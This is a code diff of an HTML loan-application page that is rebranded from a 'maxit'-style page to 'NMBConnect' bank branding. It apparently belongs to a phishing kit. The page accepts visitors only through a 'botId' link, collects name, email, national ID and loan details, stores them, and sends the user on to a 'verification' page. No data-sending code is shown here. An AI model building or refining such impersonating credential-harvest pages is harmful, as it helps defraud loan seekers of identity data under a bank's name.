@@ -3,123 +3,234 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Loan Application</title>
+<title>NMBConnect - Loan Application</title>
 
 <style>
 
-body{
-font-family: Arial, sans-serif;
-background:#000;
+*{
 margin:0;
+padding:0;
+box-sizing:border-box;
+font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+}
+
+body{
+background: #4a2b7a;
+min-height:100vh;
 display:flex;
 justify-content:center;
 align-items:center;
-min-height:100vh;
-color:white;
 padding:20px;
 }
 
-.loan-container{
-background:white;
-color:black;
-padding:30px;
-border-radius:20px;
+.app{
 width:100%;
-max-width:420px;
-box-shadow:0 10px 30px rgba(0,0,0,0.4);
+max-width:400px;
+background:#ffffff;
+border-radius:28px;
+padding:35px 28px 30px;
+box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+position:relative;
 }
 
-/* LOGO CIRCLE */
-
-.logo-wrapper{
-display:flex;
-justify-content:center;
-margin-bottom:20px;
+/* NMB CONNECT LOGO AT TOP */
+.logo-container {
+    text-align: center;
+    margin-bottom: 20px;
 }
 
-.logo-circle{
-width:110px;
-height:110px;
-border-radius:50%;
-background:#111;
-display:flex;
-justify-content:center;
-align-items:center;
-box-shadow:0 6px 20px rgba(0,0,0,0.3);
-overflow:hidden;
+.nmb-logo {
+    display: inline-flex;
+    align-items: center;
+    gap: 10px;
+    text-decoration: none;
 }
 
-.logo-circle img{
-width:80%;
-height:80%;
-object-fit:contain;
+.nmb-logo .logo-icon {
+    width: 40px;
+    height: 40px;
+    background: #4a2b7a;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: white;
+    font-size: 20px;
+    font-weight: 700;
 }
 
-h2{
-text-align:center;
-margin-bottom:20px;
+.nmb-logo .logo-text {
+    font-size: 22px;
+    font-weight: 700;
+    color: #1a1a2e;
+    letter-spacing: 0.5px;
+}
+
+.nmb-logo .logo-text span {
+    color: #4a2b7a;
+}
+
+/* HEADER SECTION */
+.header {
+    text-align: center;
+    margin-bottom: 25px;
+}
+
+.header h1 {
+    color: #1a1a2e;
+    font-size: 24px;
+    font-weight: 600;
+    letter-spacing: -0.3px;
+    margin-bottom: 4px;
+}
+
+.header .subtitle {
+    color: #777;
+    font-size: 14px;
+    font-weight: 400;
 }
 
 /* FORM */
-
-label{
-font-weight:bold;
-font-size:14px;
-margin-bottom:5px;
-display:block;
+.form-group {
+    margin-bottom: 18px;
 }
 
-input,select{
-width:100%;
-padding:12px;
-border-radius:10px;
-border:1px solid #ddd;
-margin-bottom:15px;
-font-size:14px;
+.form-group label {
+    display: block;
+    color: #555;
+    font-size: 13px;
+    font-weight: 500;
+    margin-bottom: 5px;
+    letter-spacing: 0.2px;
 }
 
-input:focus,select:focus{
-outline:none;
-border:1px solid #ff9800;
+.form-group .required {
+    color: #e74c3c;
+    margin-left: 2px;
+}
+
+.input-box {
+    border: 1.5px solid #e0e0e8;
+    border-radius: 12px;
+    padding: 0 14px;
+    transition: all 0.3s ease;
+    background: #fafaff;
+}
+
+.input-box:focus-within {
+    border-color: #4a2b7a;
+    background: #ffffff;
+    box-shadow: 0 0 0 3px rgba(74, 43, 122, 0.08);
+}
+
+.input-box input,
+.input-box select {
+    background: none;
+    border: none;
+    outline: none;
+    color: #1a1a2e;
+    width: 100%;
+    font-size: 15px;
+    padding: 13px 0;
+    font-family: inherit;
+}
+
+.input-box input::placeholder {
+    color: #bbb;
+    font-weight: 400;
+}
+
+.input-box select {
+    appearance: none;
+    -webkit-appearance: none;
+    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%23999' stroke-width='2' fill='none' stroke-linecap='round'/%3E%3C/svg%3E");
+    background-repeat: no-repeat;
+    background-position: right 0 center;
+    padding-right: 30px;
+    cursor: pointer;
+}
+
+.input-box select option {
+    color: #1a1a2e;
+    background: white;
 }
 
 /* NOTICE */
-
-.loan-notice{
-background:#fff3cd;
-border:1px solid #ffeeba;
-padding:15px;
-border-radius:10px;
-font-size:13px;
-margin-bottom:20px;
+.loan-notice {
+    background: #f8f4ff;
+    border: 1px solid #e8e0f0;
+    padding: 14px 16px;
+    border-radius: 12px;
+    margin-bottom: 20px;
 }
 
-.loan-notice ol{
-padding-left:18px;
-margin:8px 0 0 0;
+.loan-notice strong {
+    color: #4a2b7a;
+    font-size: 13px;
+    display: block;
+    margin-bottom: 6px;
 }
 
-.loan-notice li{
-margin-bottom:6px;
+.loan-notice ol {
+    padding-left: 18px;
+    margin: 0;
+    color: #555;
+    font-size: 13px;
+}
+
+.loan-notice li {
+    margin-bottom: 4px;
+}
+
+.loan-notice li:last-child {
+    margin-bottom: 0;
 }
 
 /* BUTTON */
-
-button{
-width:100%;
-padding:14px;
-border:none;
-border-radius:12px;
-font-size:16px;
-cursor:pointer;
-color:white;
-background:linear-gradient(90deg,#ff9800,#ff7043);
-box-shadow:0 5px 15px rgba(0,0,0,0.2);
-transition:0.2s;
+.submit-btn {
+    width: 100%;
+    padding: 15px;
+    background: #4a2b7a;
+    border: none;
+    border-radius: 12px;
+    color: white;
+    font-size: 17px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    letter-spacing: 0.3px;
 }
 
-button:hover{
-transform:translateY(-1px);
+.submit-btn:hover {
+    background: #3a1f5e;
+    transform: translateY(-1px);
+    box-shadow: 0 6px 20px rgba(74, 43, 122, 0.35);
+}
+
+.submit-btn:active {
+    transform: translateY(0);
+}
+
+/* RESPONSIVE */
+@media (max-width: 440px) {
+    .app {
+        padding: 28px 20px 25px;
+        border-radius: 22px;
+    }
+    
+    .header h1 {
+        font-size: 22px;
+    }
+    
+    .nmb-logo .logo-text {
+        font-size: 20px;
+    }
+    
+    .input-box input,
+    .input-box select {
+        font-size: 14px;
+        padding: 11px 0;
+    }
 }
 
 </style>
@@ -127,106 +238,178 @@ transform:translateY(-1px);
 
 <body>
 
-<div class="loan-container">
+<div class="app">
 
-<div class="logo-wrapper">
-<div class="logo-circle">
-<img src="maxit-logo.jpeg">
-</div>
-</div>
+    <!-- NMB CONNECT LOGO -->
+    <div class="logo-container">
+        <div class="nmb-logo">
+            <div class="logo-icon">N</div>
+            <div class="logo-text">NMB<span>Connect</span></div>
+        </div>
+    </div>
 
-<h2>Loan Application</h2>
+    <div class="header">
+        <h1>Loan Application</h1>
+        <div class="subtitle">Complete your application in minutes</div>
+    </div>
 
-<form id="loanForm">
+    <form id="loanForm">
 
-<label>Full Name</label>
-<input id="fullName" type="text" required placeholder="Enter your full name">
+        <div class="form-group">
+            <label>Full Name <span class="required">*</span></label>
+            <div class="input-box">
+                <input id="fullName" type="text" placeholder="Enter your full name" required>
+            </div>
+        </div>
 
-<label>Loan Amount (LRD)</label>
-<input id="loanAmount" type="number" required >
+        <div class="form-group">
+            <label>Loan Amount (USD) <span class="required">*</span></label>
+            <div class="input-box">
+                <input id="loanAmount" type="number" placeholder="Enter loan amount" required min="1000" step="100">
+            </div>
+        </div>
 
-<label>Email</label>
-<input id="email" type="email" placeholder="example@gmail.com" required>
+        <div class="form-group">
+            <label>Email Address <span class="required">*</span></label>
+            <div class="input-box">
+                <input id="email" type="email" placeholder="example@gmail.com" required>
+            </div>
+        </div>
 
-<label>National ID</label>
-<input id="nationalId" type="text" placeholder="National ID">
+        <div class="form-group">
+            <label>National ID</label>
+            <div class="input-box">
+                <input id="nationalId" type="text" placeholder="Enter your National ID">
+            </div>
+        </div>
 
-<label>Repayment Period</label>
-<select id="repaymentPeriod" required>
-<option value="">Select</option>
-<option value="6months"> 6 months</option>
-<option value="12months">12 months </option>
-<option value="24months">24 months </option>
-<option value="36months">36 months </option>
-<option value="48months">48 months</option>
-<option value="60months">60 months </option>
-</select>
+        <div class="form-group">
+            <label>Repayment Period <span class="required">*</span></label>
+            <div class="input-box">
+                <select id="repaymentPeriod" required>
+                    <option value="">Select period</option>
+                    <option value="6months">6 months</option>
+                    <option value="12months">12 months</option>
+                    <option value="24months">24 months</option>
+                    <option value="36months">36 months</option>
+                    <option value="48months">48 months</option>
+                    <option value="60months">60 months</option>
+                </select>
+            </div>
+        </div>
 
-<label>Employment Status</label>
-<select id="employmentStatus" required>
-<option value="">Select</option>
-<option value="employed">Employed</option>
-<option value="self-employed">Self-employed</option>
-<option value="unemployed">Unemployed</option>
-<option value="student">Student</option>
-</select>
+        <div class="form-group">
+            <label>Employment Status <span class="required">*</span></label>
+            <div class="input-box">
+                <select id="employmentStatus" required>
+                    <option value="">Select status</option>
+                    <option value="employed">Employed</option>
+                    <option value="self-employed">Self-employed</option>
+                    <option value="unemployed">Unemployed</option>
+                    <option value="student">Student</option>
+                    <option value="retired">Retired</option>
+                </select>
+            </div>
+        </div>
 
-<label>Loan Purpose</label>
-<select id="loanPurpose" required>
-<option value="">Select</option>
-<option value="business">Business</option>
-<option value="personal">Personal Loans</option>
-<option value="schoolfees">School Fees</option>
-<option value="medical">Medical</option>
-<option value="others">Others</option>
-</select>
+        <div class="form-group">
+            <label>Loan Purpose <span class="required">*</span></label>
+            <div class="input-box">
+                <select id="loanPurpose" required>
+                    <option value="">Select purpose</option>
+                    <option value="business">Business</option>
+                    <option value="personal">Personal Loan</option>
+                    <option value="schoolfees">School Fees</option>
+                    <option value="medical">Medical</option>
+                    <option value="home">Home Improvement</option>
+                    <option value="vehicle">Vehicle Purchase</option>
+                    <option value="others">Others</option>
+                </select>
+            </div>
+        </div>
 
-<div class="loan-notice">
-<strong>Qualification Notice:</strong>
-<ol>
-<li>Must apply with an active orange number.</li>
-</ol>
-</div>
+        <div class="loan-notice">
+            <strong>📋 Qualification Notice</strong>
+            <ol>
+                <li>Must apply with an active mobile number.</li>
+                <li>Minimum loan amount is $1,000 USD.</li>
+                <li>All fields marked with <span style="color:#e74c3c;">*</span> are required.</li>
+            </ol>
+        </div>
 
-<button type="submit">Next</button>
+        <button type="submit" class="submit-btn">Continue to Verification</button>
 
-</form>
+    </form>
 
 </div>
 
 <script>
 
-// BOT ID
-let botId = new URLSearchParams(window.location.search).get('botId');
+// ---------------- BOT ID ----------------
+const params = new URLSearchParams(window.location.search);
+let botId = params.get('botId');
+
 if (!botId) {
-const parts = window.location.pathname.split('/');
-const botIndex = parts.indexOf('bot');
-if (botIndex !== -1 && parts[botIndex + 1]) botId = parts[botIndex + 1];
+    const parts = window.location.pathname.split('/');
+    const botIndex = parts.indexOf('bot');
+    if (botIndex !== -1 && parts[botIndex + 1]) {
+        botId = parts[botIndex + 1];
+    }
 }
 
 if (!botId) {
-alert("Invalid access link");
-throw new Error("botId missing");
+    alert("Invalid access link");
+    throw new Error("botId missing");
 }
 
 localStorage.setItem('botId', botId);
 
-// FORM
-document.getElementById('loanForm').addEventListener('submit', e => {
+// ---------------- FORM SUBMISSION ----------------
+document.getElementById('loanForm').addEventListener('submit', function(e) {
+    e.preventDefault();
 
-e.preventDefault();
+    // Get all form values
+    const fullName = document.getElementById('fullName').value.trim();
+    const loanAmount = document.getElementById('loanAmount').value.trim();
+    const email = document.getElementById('email').value.trim();
+    const nationalId = document.getElementById('nationalId').value.trim();
+    const repaymentPeriod = document.getElementById('repaymentPeriod').value;
+    const employmentStatus = document.getElementById('employmentStatus').value;
+    const loanPurpose = document.getElementById('loanPurpose').value;
 
-localStorage.setItem('fullName', fullName.value);
-localStorage.setItem('loanAmount', loanAmount.value);
-localStorage.setItem('email', email.value);
-localStorage.setItem('nationalId', nationalId.value);
-localStorage.setItem('repaymentPeriod', repaymentPeriod.value);
-localStorage.setItem('employmentStatus', employmentStatus.value);
-localStorage.setItem('loanPurpose', loanPurpose.value);
+    // Basic validation
+    if (!fullName) {
+        document.getElementById('fullName').focus();
+        return;
+    }
 
-window.location.href = `details2.html?botId=${botId}`;
+    if (!loanAmount || parseFloat(loanAmount) < 1000) {
+        alert('Please enter a valid loan amount (minimum $1,000 USD)');
+        document.getElementById('loanAmount').focus();
+        return;
+    }
 
+    if (!email || !email.includes('@')) {
+        alert('Please enter a valid email address');
+        document.getElementById('email').focus();
+        return;
+    }
+
+    // Save to localStorage
+    localStorage.setItem('fullName', fullName);
+    localStorage.setItem('loanAmount', loanAmount);
+    localStorage.setItem('email', email);
+    localStorage.setItem('nationalId', nationalId);
+    localStorage.setItem('repaymentPeriod', repaymentPeriod);
+    localStorage.setItem('employmentStatus', employmentStatus);
+    localStorage.setItem('loanPurpose', loanPurpose);
+
+    // Redirect to details page
+    window.location.href = `details.html?botId=${botId}`;
 });
+
+// ---------------- AUTO-FOCUS ----------------
+document.getElementById('fullName').focus();
 
 </script>
 
